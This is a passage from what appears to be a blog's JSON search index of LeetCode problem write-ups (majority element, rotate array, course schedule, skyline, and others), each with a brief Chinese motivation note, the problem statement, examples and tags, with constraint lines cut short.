[3,1,3,4,3]:- Remove the first two 3's, then nums = [1,4,3]There are no more pairs that sum up to 6, hence a total of 1 operation. Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Array","Two Pointers","Hash Table","Sorting"]},{"title":"leetcode-169 - Majority Element","url":"/2021/07/leetcode-169/","content":"動機\n複習Counter與認識一個神奇的算法\n\nProblem\nGiven an array nums of size n, return the majority element.The majority element is the element that appears more than ⌊n / 2⌋ times. You may assume that the majority element always exists in the array. Example 1:Input: nums = [3,2,3]Output: 3Example 2:Input: nums = [2,2,1,1,1,2,2]Output: 2 Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Divide and Conquer","Hash Table","Sorting","Counting"]},{"title":"leetcode-1691 - Maximum Height by Stacking Cuboids","url":"/2021/07/leetcode-1691/","content":"動機\n原來在py3要用custom cmp是這麼麻煩\n\nProblem\nGiven n cuboids where the dimensions of the ith cuboid is cuboids[i] = [widthi, lengthi, heighti] (0-indexed). Choose a subset of cuboids and place them on each other.You can place cuboid i on cuboid j if widthi ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array","Sorting"]},{"title":"leetcode-17 - Letter Combinations of a Phone Number","url":"/2021/07/leetcode-17/","content":"動機\n複習backtrack\n\nProblem\nGiven a string containing digits from 2-9 inclusive, return all possible letter combinations that the number could represent. Return the answer in any order.A mapping of digit to letters (just like on the telephone buttons) is given below. Note that 1 does not map to any letters. Example 1:Input: digits = 23Output: [ad,ae,af,bd,be,bf,cd,ce,cf]Example 2:Input: digits = Output: []Example 3:Input: digits = 2Output: [a,b,c] Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["String","Hash Table","Backtracking"]},{"title":"leetcode-187 - Repeated DNA Sequences","url":"/2021/07/leetcode-187/","content":"動機\n複習sliding window\n\nProblem\nThe DNA sequence is composed of a series of nucleotides abbreviated as 'A', 'C', 'G', and 'T'.For example, ACGAATTCCG is a DNA sequence.When studying DNA, it is useful to identify repeated sequences within the DNA.Given a string s that represents a DNA sequence, return all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule. You may return the answer in any order. Example 1:Input: s = AAAAACCCCCAAAAACCCCCCAAAAAGGGTTTOutput: [AAAAACCCCC,CCCCCAAAAA]Example 2:Input: s = AAAAAAAAAAAAAOutput: [AAAAAAAAAA] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Bit Manipulation","Hash Table","Sliding Window","Hash Function","Rolling Hash"]},{"title":"leetcode-189 - Rotate Array","url":"/2021/07/leetcode-189/","content":"動機\n題目很賤，但賤的心服口服\nreverse原來這麼泛用嗎?!\n\nProblem\nGiven an array, rotate the array to the right by k steps, where k is non-negative. Example 1:Input: nums = [1,2,3,4,5,6,7], k = 3Output: [5,6,7,1,2,3,4]Explanation:rotate 1 steps to the right: [7,1,2,3,4,5,6]rotate 2 steps to the right: [6,7,1,2,3,4,5]rotate 3 steps to the right: [5,6,7,1,2,3,4]Example 2:Input: nums = [-1,-100,3,99], k = 2Output: [3,99,-1,-100]Explanation: rotate 1 steps to the right: [99,-1,-100,3]rotate 2 steps to the right: [3,99,-1,-100] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Array","Math","Two Pointers"]},{"title":"leetcode-19 - Remove Nth Node From End of List","url":"/2021/07/leetcode-19/","content":"動機\n對ㄟ，可以先拉一個範圍去走，有點像求中點\n\nProblem\nGiven the head of a linked list, remove the nth node from the end of the list and return its head. Example 1:Input: head = [1,2,3,4,5], n = 2Output: [1,2,3,5]Example 2:Input: head = [1], n = 1Output: []Example 3:Input: head = [1,2], n = 1Output: [1] Constraints:The number of nodes in the list is sz.1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Two Pointers","Linked List"]},{"title":"leetcode-198 - House Robber","url":"/2021/07/leetcode-198/","content":"動機\n雖然說是環狀，但當成一般有終點的就好\n同時，dp最好從終點去推!!\n\nProblem\nYou are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security systems connected and it will automatically contact the police if two adjacent houses were broken into on the same night.Given an integer array nums representing the amount of money of each house, return the maximum amount of money you can rob tonight without alerting the police. Example 1:Input: nums = [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).Total amount you can rob = 1 + 3 = 4.Example 2:Input: nums = [2,7,9,3,1]Output: 12Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1).Total amount you can rob = 2 + 9 + 1 = 12. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-199 - Binary Tree Right Side View","url":"/2021/07/leetcode-199/","content":"動機\n複習bfs\n\nProblem\nGiven the root of a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom. Example 1:Input: root = [1,2,3,null,5,null,4]Output: [1,3,4]Example 2:Input: root = [1,null,3]Output: [1,3]Example 3:Input: root = []Output: [] Constraints:The number of nodes in the tree is in the range [0, 100].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-2 - Add Two Numbers","url":"/2021/07/leetcode-2/","content":"動機\n要記得進位\n\nProblem\nYou are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order, and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.You may assume the two numbers do not contain any leading zero, except the number 0 itself. Example 1:Input: l1 = [2,4,3], l2 = [5,6,4]Output: [7,0,8]Explanation: 342 + 465 = 807.Example 2:Input: l1 = [0], l2 = [0]Output: [0]Example 3:Input: l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]Output: [8,9,9,9,0,0,0,1] Constraints:The number of nodes in each linked list is in the range [1, 100].0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Recursion","Math","Linked List"]},{"title":"leetcode-20 - Valid Parentheses","url":"/2021/07/leetcode-20/","content":"動機\n複習stack\n\nProblem\nGiven a string s containing just the characters '(', ')', '&#123;', '&#125;', '[' and ']', determine if the input string is valid.An input string is valid if:Open brackets must be closed by the same type of brackets.Open brackets must be closed in the correct order. Example 1:Input: s = ()Output: trueExample 2:Input: s = ()[]{}Output: trueExample 3:Input: s = (]Output: falseExample 4:Input: s = ([)]Output: falseExample 5:Input: s = {[]}Output: true Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","Blind Curated 75"],"tags":["String","Stack"]},{"title":"leetcode-203 - Remove Linked List Elements","url":"/2021/07/leetcode-203/","content":"動機\n複習Linked list的remove\n\nProblem\nGiven the head of a linked list and an integer val, remove all the nodes of the linked list that has Node.val == val, and return the new head. Example 1:Input: head = [1,2,6,3,4,5,6], val = 6Output: [1,2,3,4,5]Example 2:Input: head = [], val = 1Output: []Example 3:Input: head = [7,7,7,7], val = 7Output: [] Constraints:The number of nodes in the list is in the range [0, 104].1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Recursion","Linked List"]},{"title":"leetcode-204 - Count Primes","url":"/2021/07/leetcode-204/","content":"動機\n之前是用ruby的buildin作弊阿wwwww\n\nProblem\nCount the number of prime numbers less than a non-negative number, n. Example 1:Input: n = 10Output: 4Explanation: There are 4 prime numbers less than 10, they are 2, 3, 5, 7.Example 2:Input: n = 0Output: 0Example 3:Input: n = 1Output: 0 Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Math","Number Theory","Enumeration"]},{"title":"leetcode-206 - Reverse Linked List","url":"/2021/07/leetcode-206/","content":"動機\n複習linked list的reverse\n\nProblem\nGiven the head of a singly linked list, reverse the list, and return the reversed list. Example 1:Input: head = [1,2,3,4,5]Output: [5,4,3,2,1]Example 2:Input: head = [1,2]Output: [2,1]Example 3:Input: head = []Output: [] Constraints:The number of nodes in the list is the range [0, 5000].-5000 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Recursion","Linked List"]},{"title":"leetcode-207 - Course Schedule","url":"/2021/07/leetcode-207/","content":"動機\n複習dfs\n話說原來有擋修是這麼麻煩的事\n\nProblem\nThere are a total of numCourses courses you have to take, labeled from 0 to numCourses - 1. You are given an array prerequisites where prerequisites[i] = [ai, bi] indicates that you must take course bi first if you want to take course ai.For example, the pair [0, 1], indicates that to take course 0 you have to first take course 1.Return true if you can finish all courses. Otherwise, return false. Example 1:Input: numCourses = 2, prerequisites = [[1,0]]Output: trueExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So it is possible.Example 2:Input: numCourses = 2, prerequisites = [[1,0],[0,1]]Output: falseExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0, and to take course 0 you should also have finished course 1. So it is impossible. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Breadth-First Search","Depth-First Search","Graph","Topological Sort"]},{"title":"leetcode-209 - Minimum Size Subarray Sum","url":"/2021/07/leetcode-209/","content":"動機\n與560不同他可以用sliding window\n\nprefix sum + binary search\nprefix sum in fly + sliding window\n\n\nProblem\nGiven an array of positive integers nums and a positive integer target, return the minimal length of a contiguous subarray [numsl, numsl+1, ..., numsr-1, numsr] of which the sum is greater than or equal to target. If there is no such subarray, return 0 instead. Example 1:Input: target = 7, nums = [2,3,1,2,4,3]Output: 2Explanation: The subarray [4,3] has the minimal length under the problem constraint.Example 2:Input: target = 4, nums = [1,4,4]Output: 1Example 3:Input: target = 11, nums = [1,1,1,1,1,1,1,1]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad"],"tags":["Array","Prefix Sum","Binary Search","Sliding Window"]},{"title":"leetcode-21 - Merge Two Sorted Lists","url":"/2021/07/leetcode-21/","content":"動機\n直接用23的解就ok了\n\nProblem\nMerge two sorted linked lists and return it as a sorted list. The list should be made by splicing together the nodes of the first two lists. Example 1:Input: l1 = [1,2,4], l2 = [1,3,4]Output: [1,1,2,3,4,4]Example 2:Input: l1 = [], l2 = []Output: []Example 3:Input: l1 = [], l2 = [0]Output: [0] Constraints:The number of nodes in both lists is in the range [0, 50].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Recursion","Linked List"]},{"title":"leetcode-210 - Course Schedule II","url":"/2021/07/leetcode-210/","content":"動機\n沒辦法用cache_computing偷懶了\n\nProblem\nThere are a total of numCourses courses you have to take, labeled from 0 to numCourses - 1. You are given an array prerequisites where prerequisites[i] = [ai, bi] indicates that you must take course bi first if you want to take course ai.For example, the pair [0, 1], indicates that to take course 0 you have to first take course 1.Return the ordering of courses you should take to finish all courses. If there are many valid answers, return any of them. If it is impossible to finish all courses, return an empty array. Example 1:Input: numCourses = 2, prerequisites = [[1,0]]Output: [0,1]Explanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1].Example 2:Input: numCourses = 4, prerequisites = [[1,0],[2,0],[3,1],[3,2]]Output: [0,2,1,3]Explanation: There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0.So one correct course order is [0,1,2,3]. Another correct ordering is [0,2,1,3].Example 3:Input: numCourses = 1, prerequisites = []Output: [0] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Breadth-First Search","Depth-First Search","Graph","Topological Sort"]},{"title":"leetcode-215 - Kth Largest Element in an Array","url":"/2021/07/leetcode-215/","content":"動機\n沒有魔法的一題\n\nProblem\nGiven an integer array nums and an integer k, return the kth largest element in the array.Note that it is the kth largest element in the sorted order, not the kth distinct element. Example 1:Input: nums = [3,2,1,5,6,4], k = 2Output: 5Example 2:Input: nums = [3,2,3,1,2,4,5,5,6], k = 4Output: 4 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Divide and Conquer","Heap (Priority Queue)","Sorting","Quickselect"]},{"title":"leetcode-216 - Combination Sum III","url":"/2021/07/leetcode-216/","content":"動機\n這比上一題(40)簡單\n\nProblem\nFind all valid combinations of k numbers that sum up to n such that the following conditions are true:Only numbers 1 through 9 are used.Each number is used at most once.Return a list of all possible valid combinations. The list must not contain the same combination twice, and the combinations may be returned in any order. Example 1:Input: k = 3, n = 7Output: [[1,2,4]]Explanation:1 + 2 + 4 = 7There are no other valid combinations.Example 2:Input: k = 3, n = 9Output: [[1,2,6],[1,3,5],[2,3,4]]Explanation:1 + 2 + 6 = 91 + 3 + 5 = 92 + 3 + 4 = 9There are no other valid combinations.Example 3:Input: k = 4, n = 1Output: []Explanation: There are no valid combinations.Using 4 different numbers in the range [1,9], the smallest sum we can get is 1+2+3+4 = 10 and since 10 > 1, there are no valid combination.Example 4:Input: k = 3, n = 2Output: []Explanation: There are no valid combinations.Example 5:Input: k = 9, n = 45Output: [[1,2,3,4,5,6,7,8,9]]Explanation:1 + 2 + 3 + 4 + 5 + 6 + 7 + 8 + 9 = 45There are no other valid combinations. Constraints:2 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Backtracking"]},{"title":"leetcode-218 - The Skyline Problem","url":"/2021/07/leetcode-218/","content":"動機\n被這題搞了兩天，所以要記錄下來\n以前沒有看線段合併的Divide and Conquer，所以要記錄下來 (還債)\n以前沒有看Segment tree，所以要記錄下來 (還債)\n\nProblem\nA city's skyline is the outer contour of the silhouette formed by all the buildings in that city when viewed from a distance. Given the locations and heights of all the buildings, return the skyline formed by these buildings collectively.The geometric information of each building is given in the array buildings where buildings[i] = [lefti, righti, heighti]:lefti is the x coordinate of the left edge of the ith building.righti is the x coordinate of the right edge of the ith building.heighti is the height of the ith building.You may assume all buildings are perfect rectangles grounded on an absolutely flat surface at height 0.The skyline should be represented as a list of key points sorted by their x-coordinate in the form [[x1,y1],[x2,y2],...]. Each key point is the left endpoint of some horizontal segment in the skyline except the last point in the list, which always has a y-coordinate 0 and is used to mark the skyline's termination where the rightmost building ends. Any ground between the leftmost and rightmost buildings should be part of the skyline's contour.Note: There must be no consecutive horizontal lines of equal height in the output skyline. For instance, [...,[2 3],[4 5],[7 5],[11 5],[12 7],...] is not acceptable; the three lines of height 5 should be merged into one in the final output as such: [...,[2 3],[4 5],[12 7],...] Example 1:Input: buildings = [[2,9,10],[3,7,15],[5,12,12],[15,20,10],[19,24,8]]Output: [[2,10],[3,15],[7,12],[12,0],[15,10],[20,8],[24,0]]Explanation:Figure A shows the buildings of the input.Figure B shows the skyline formed by those buildings. The red points in figure B represent the key points in the output list.Example 2:Input: buildings = [[0,2,3],[2,5,3]]Output: [[0,3],[5,0]] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Divide and Conquer","Heap (Priority Queue)","Ordered Set","Segment Tree","Binary Indexed Tree","Line Sweep"]},{"title":"leetcode-22 - Generate Parentheses","url":"/2021/07/leetcode-22/","content":"動機\n複習backtrack，比起以前的commit，發現現在code越寫越短了\n\nProblem\nGiven n pairs of parentheses, write a function to generate all combinations of well-formed parentheses. Example 1:Input: n = 3Output: [((())),(()()),(())(),()(()),()()()]Example 2:Input: n = 1Output: [()] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","String","Backtracking"]},{"title":"leetcode-220 - Contains Duplicate III","url":"/2021/07/leetcode-220/","content":"動機\n很喜歡的一題，看到怎麼處理abs\n\nProblem\nGiven an integer array nums and two integers k and t, return true if there are two distinct indices i and j in the array such that abs(nums[i] - nums[j]) ","categories":["Algorithm","Leetcode"],"tags":["Array","Sorting","Bucket Sort","Sliding Window","Ordered Set"]},{"title":"leetcode-221 - Maximal Square","url":"/2021/07/leetcode-221/","content":"動機\n設計dp時，要注意到return的東西要可以被接\n\nProblem\nGiven an m x n binary matrix filled with 0's and 1's, find the largest square containing only 1's and return its area. Example 1:Input: matrix = [[1,0,1,0,0],[1,0,1,1,1],[1,1,1,1,1],[1,0,0,1,0]]Output: 4Example 2:Input: matrix = [[0,1],[1,0]]Output: 1Example 3:Input: matrix = [[0]]Output: 0 Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array","Matrix"]},{"title":"leetcode-226 - Invert Binary Tree","url":"/2021/07/leetcode-226/","content":"動機\n寫的時候忘了這是交換…\n\nProblem\nGiven the root of a binary tree, invert the tree, and return its root. Example 1:Input: root = [4,2,7,1,3,6,9]Output: [4,7,2,9,6,3,1]Example 2:Input: root = [2,1,3]Output: [2,3,1]Example 3:Input: root = []Output: [] Constraints:The number of nodes in the tree is in the range [0, 100].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad","Blind Curated 75"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-228 - Summary Ranges","url":"/2021/07/leetcode-228/","content":"動機\n雖說是水題，但有用到一個python特點\n\nProblem\nYou are given a sorted unique integer array nums.Return the smallest sorted list of ranges that cover all the numbers in the array exactly. That is, each element of nums is covered by exactly one of the ranges, and there is no integer x such that x is in one of the ranges but not in nums.Each range [a,b] in the list should be output as:a->b if a != ba if a == b Example 1:Input: nums = [0,1,2,4,5,7]Output: [0->2,4->5,7]Explanation: The ranges are:[0,2] --> 0->2[4,5] --> 4->5[7,7] --> 7Example 2:Input: nums = [0,2,3,4,6,8,9]Output: [0,2->4,6,8->9]Explanation: The ranges are:[0,0] --> 0[2,4] --> 2->4[6,6] --> 6[8,9] --> 8->9Example 3:Input: nums = []Output: []Example 4:Input: nums = [-1]Output: [-1]Example 5:Input: nums = [0]Output: [0] Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Array"]},{"title":"leetcode-229 - Majority Element II","url":"/2021/07/leetcode-229/","content":"動機\n太偏門了吧\n\nProblem\nGiven an integer array of size n, find all elements that appear more than ⌊ n/3 ⌋ times.Follow-up: Could you solve the problem in linear time and in O(1) space? Example 1:Input: nums = [3,2,3]Output: [3]Example 2:Input: nums = [1]Output: [1]Example 3:Input: nums = [1,2]Output: [1,2] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Hash Table","Sorting","Counting"]},{"title":"leetcode-23 - Merge k Sorted Lists","url":"/2021/07/leetcode-23/","content":"動機\n這題為什麼是hard?\n\nProblem\nYou are given an array of k linked-lists lists, each linked-list is sorted in ascending order.Merge all the linked-lists into one sorted linked-list and return it. Example 1:Input: lists = [[1,4,5],[1,3,4],[2,6]]Output: [1,1,2,3,4,4,5,6]Explanation: The linked-lists are:[  1->4->5,  1->3->4,  2->6]merging them into one sorted list:1->1->2->3->4->4->5->6Example 2:Input: lists = []Output: []Example 3:Input: lists = [[]]Output: [] Constraints:k == lists.length0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Divide and Conquer","Heap (Priority Queue)","Linked List","Merge Sort"]},{"title":"leetcode-232 - Implement Queue using Stacks","url":"/2021/07/leetcode-232/","content":"動機\n很經典，但沒想過可以用兩個stack\n\nProblem\nImplement a first in first out (FIFO) queue using only two stacks. The implemented queue should support all the functions of a normal queue (push, peek, pop, and empty).Implement the MyQueue class:void push(int x) Pushes element x to the back of the queue.int pop() Removes the element from the front of the queue and returns it.int peek() Returns the element at the front of the queue.boolean empty() Returns true if the queue is empty, false otherwise.Notes:You must use only standard operations of a stack, which means only push to top, peek/pop from top, size, and is empty operations are valid.Depending on your language, the stack may not be supported natively. You may simulate a stack using a list or deque (double-ended queue) as long as you use only a stack's standard operations.Follow-up: Can you implement the queue such that each operation is amortized O(1) time complexity? In other words, performing n operations will take overall O(n) time even if one of those operations may take longer. Example 1:Input[MyQueue, push, push, peek, pop, empty][[], [1], [2], [], [], []]Output[null, null, null, 1, 1, false]ExplanationMyQueue myQueue = new MyQueue();myQueue.push(1); // queue is: [1]myQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)myQueue.peek(); // return 1myQueue.pop(); // return 1, queue is [2]myQueue.empty(); // return false Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Stack","Design","Queue"]},{"title":"leetcode-234 - Palindrome Linked List","url":"/2021/07/leetcode-234/","content":"動機\n可以去看143\n重點是找中點時判斷長度的奇偶姓!!\n\nProblem\nGiven the head of a singly linked list, return true if it is a palindrome. Example 1:Input: head = [1,2,2,1]Output: trueExample 2:Input: head = [1,2]Output: false Constraints:The number of nodes in the list is in the range [1, 105].0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Recursion","Stack","Two Pointers","Linked List"]},{"title":"leetcode-235 - Lowest Common Ancestor of a Binary Search Tree","url":"/2021/07/leetcode-235/","content":"動機\n善用binary search tree，所以才是easy\n\nProblem\nGiven a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).” Example 1:Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8Output: 6Explanation: The LCA of nodes 2 and 8 is 6.Example 2:Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4Output: 2Explanation: The LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.Example 3:Input: root = [2,1], p = 2, q = 1Output: 2 Constraints:The number of nodes in the tree is in the range [2, 105].-109 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Depth-First Search","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-236 - Lowest Common Ancestor of a Binary Tree","url":"/2021/07/leetcode-236/","content":"動機\n我忘了localty\n\nProblem\nGiven a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).” Example 1:Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1Output: 3Explanation: The LCA of nodes 5 and 1 is 3.Example 2:Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4Output: 5Explanation: The LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.Example 3:Input: root = [1,2], p = 1, q = 2Output: 1 Constraints:The number of nodes in the tree is in the range [2, 105].-109 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-237 - Delete Node in a Linked List","url":"/2021/07/leetcode-237/","content":"動機\n我的刪除不是你的刪除\n\nProblem\nWrite a function to delete a node in a singly-linked list. You will not be given access to the head of the list, instead you will be given access to the node to be deleted directly.It is guaranteed that the node to be deleted is not a tail node in the list. Example 1:Input: head = [4,5,1,9], node = 5Output: [4,1,9]Explanation: You are given the second node with value 5, the linked list should become 4 -> 1 -> 9 after calling your function.Example 2:Input: head = [4,5,1,9], node = 1Output: [4,5,9]Explanation: You are given the third node with value 1, the linked list should become 4 -> 5 -> 9 after calling your function.Example 3:Input: head = [1,2,3,4], node = 3Output: [1,2,4]Example 4:Input: head = [0,1], node = 0Output: [1]Example 5:Input: head = [-3,5,-99], node = -3Output: [5,-99] Constraints:The number of the nodes in the given list is in the range [2, 1000].-1000 ","categories":["Algorithm","Leetcode","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Linked List"]},{"title":"leetcode-238 - Product of Array Except Self","url":"/2021/07/leetcode-238/","content":"動機\n由左到右與由右到左去組合!!\n\nProblem\nGiven an integer array nums, return an array answer such that answer[i] is equal to the product of all the elements of nums except nums[i].The product of any prefix or suffix of nums is guaranteed to fit in a 32-bit integer.You must write an algorithm that runs in O(n) time and without using the division operation. Example 1:Input: nums = [1,2,3,4]Output: [24,12,8,6]Example 2:Input: nums = [-1,1,0,-3,3]Output: [0,0,9,0,0] Constraints:2 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Prefix Sum"]},{"title":"leetcode-24 - Swap Nodes in Pairs","url":"/2021/07/leetcode-24/","content":"動機\n接ptr\n\nProblem\nGiven a linked list, swap every two adjacent nodes and return its head. You must solve the problem without modifying the values in the list's nodes (i.e., only nodes themselves may be changed.) Example 1:Input: head = [1,2,3,4]Output: [2,1,4,3]Example 2:Input: head = []Output: []Example 3:Input: head = [1]Output: [1] Constraints:The number of nodes in the list is in the range [0, 100].0 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Recursion","Linked List"]},{"title":"leetcode-240 - Search a 2D Matrix II","url":"/2021/07/leetcode-240/","content":"動機\n複習saddle back\n\nProblem\nWrite an efficient algorithm that searches for a target value in an m x n integer matrix. The matrix has the following properties:Integers in each row are sorted in ascending from left to right.Integers in each column are sorted in ascending from top to bottom. Example 1:Input: matrix = [[1,4,7,11,15],[2,5,8,12,19],[3,6,9,16,22],[10,13,14,17,24],[18,21,23,26,30]], target = 5Output: trueExample 2:Input: matrix = [[1,4,7,11,15],[2,5,8,12,19],[3,6,9,16,22],[10,13,14,17,24],[18,21,23,26,30]], target = 20Output: false Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Matrix","Divide and Conquer","Binary Search"]},{"title":"leetcode-242 - Valid Anagram","url":"/2021/07/leetcode-242/","content":"動機\n複習Counter\n\nProblem\nGiven two strings s and t, return true if t is an anagram of s, and false otherwise. Example 1:Input: s = anagram, t = nagaramOutput: trueExample 2:Input: s = rat, t = carOutput: false Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["String","Hash Table","Sorting"]},{"title":"leetcode-25 - Reverse Nodes in k-Group","url":"/2021/07/leetcode-25/","content":"動機\n之前寫的很爛，居然還用到例外!?\n所以重寫\n\nProblem\nGiven a linked list, reverse the nodes of a linked list k at a time and return its modified list.k is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes, in the end, should remain as it is.You may not alter the values in the list's nodes, only nodes themselves may be changed. Example 1:Input: head = [1,2,3,4,5], k = 2Output: [2,1,4,3,5]Example 2:Input: head = [1,2,3,4,5], k = 3Output: [3,2,1,4,5]Example 3:Input: head = [1,2,3,4,5], k = 1Output: [1,2,3,4,5]Example 4:Input: head = [1], k = 1Output: [1] Constraints:The number of nodes in the list is in the range sz.1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Recursion","Linked List"]},{"title":"leetcode-26 - Remove Duplicates from Sorted Array","url":"/2021/07/leetcode-26/","content":"動機\n很像selection sort\n\nProblem\nGiven an integer array nums sorted in non-decreasing order, remove the duplicates in-place such that each unique element appears only once. The relative order of the elements should be kept the same.Since it is impossible to change the length of the array in some languages, you must instead have the result be placed in the first part of the array nums. More formally, if there are k elements after removing the duplicates, then the first k elements of nums should hold the final result. It does not matter what you leave beyond the first k elements.Return k after placing the final result in the first k slots of nums.Do not allocate extra space for another array. You must do this by modifying the input array in-place with O(1) extra memory.Custom Judge:The judge will test your solution with the following code:int[] nums = [...]; // Input arrayint[] expectedNums = [...]; // The expected answer with correct lengthint k = removeDuplicates(nums); // Calls your implementationassert k == expectedNums.length;for (int i = 0; i < k; i++) {    assert nums[i] == expectedNums[i];}If all assertions pass, then your solution will be accepted. Example 1:Input: nums = [1,1,2]Output: 2, nums = [1,2,_]Explanation: Your function should return k = 2, with the first two elements of nums being 1 and 2 respectively.It does not matter what you leave beyond the returned k (hence they are underscores).Example 2:Input: nums = [0,0,1,1,1,2,2,3,3,4]Output: 5, nums = [0,1,2,3,4,_,_,_,_,_]Explanation: Your function should return k = 5, with the first five elements of nums being 0, 1, 2, 3, and 4 respectively.It does not matter what you leave beyond the returned k (hence they are underscores). Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Two Pointers"]},{"title":"leetcode-268 - Missing Number","url":"/2021/07/leetcode-268/","content":"動機\n以為要用bsearch…\n結果是搞混了…\n\nProblem\nGiven an array nums containing n distinct numbers in the range [0, n], return the only number in the range that is missing from the array.Follow up: Could you implement a solution using only O(1) extra space complexity and O(n) runtime complexity? Example 1:Input: nums = [3,0,1]Output: 2Explanation: n = 3 since there are 3 numbers, so all numbers are in the range [0,3]. 2 is the missing number in the range since it does not appear in nums.Example 2:Input: nums = [0,1]Output: 2Explanation: n = 2 since there are 2 numbers, so all numbers are in the range [0,2]. 2 is the missing number in the range since it does not appear in nums.Example 3:Input: nums = [9,6,4,2,3,5,7,0,1]Output: 8Explanation: n = 9 since there are 9 numbers, 